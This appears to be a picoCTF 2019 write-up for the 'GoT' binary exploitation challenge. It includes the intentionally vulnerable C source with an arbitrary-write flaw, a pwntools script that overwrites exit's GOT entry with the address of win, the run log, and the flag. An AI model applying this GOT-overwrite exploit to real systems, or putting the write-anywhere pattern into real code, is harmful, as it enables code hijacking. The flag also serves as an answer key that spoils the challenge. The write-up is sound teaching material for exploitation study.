# GoT
Binary Exploitation, 350 points

## Description:
> You can only change one address, here is the problem: program.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define FLAG_BUFFER 128

void win() {
  char buf[FLAG_BUFFER];
  FILE *f = fopen("flag.txt","r");
  fgets(buf,FLAG_BUFFER,f);
  puts(buf);
  fflush(stdout);
}


int *pointer;

int main(int argc, char *argv[])
{
  
   puts("You can just overwrite an address, what can you do?\n");
   puts("Input address\n");
   scanf("%d",&pointer);
   puts("Input value?\n");
   scanf("%d",pointer);
   puts("The following line should print the flag\n");
   exit(0);
}

```


## Solution:

This challenge is similar to last year's [got-shell](/2018_picoCTF/got-shell.md). We overwrite the `.got.plt` entry for `exit` with the address of `win`, and `win` gets called instead of `exit`, printing the flag.

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/got_6_6847d8dfcf9a22a7981ba5d338501c50/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

import os

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

io = start()

log.info("Address of 'exit' .got.plt entry: {}".format(hex(exe.got['exit'])))
log.info("Address of 'win': {}".format(hex(exe.symbols['win'])))
io.sendlineafter("Input address", str(exe.got['exit']))
io.sendlineafter("Input value?", str(exe.symbols['win']))
print io.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/GoT# python exploit.py
[*] '/media/sf_CTFs/pico/GoT/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.VgJr6w5yT6'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/got_6_6847d8dfcf9a22a7981ba5d338501c50'
[+] Starting remote process '/problems/got_6_6847d8dfcf9a22a7981ba5d338501c50/vuln' on 2019shell1.picoctf.com: pid 126609
[*] Address of 'exit' .got.plt entry: 0x804a01c
[*] Address of 'win': 0x80485c6
[+] Receiving all data: Done (85B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 126609)


The following line should print the flag

picoCTF{A_s0ng_0f_1C3_and_f1r3_2a9d1eaf}
```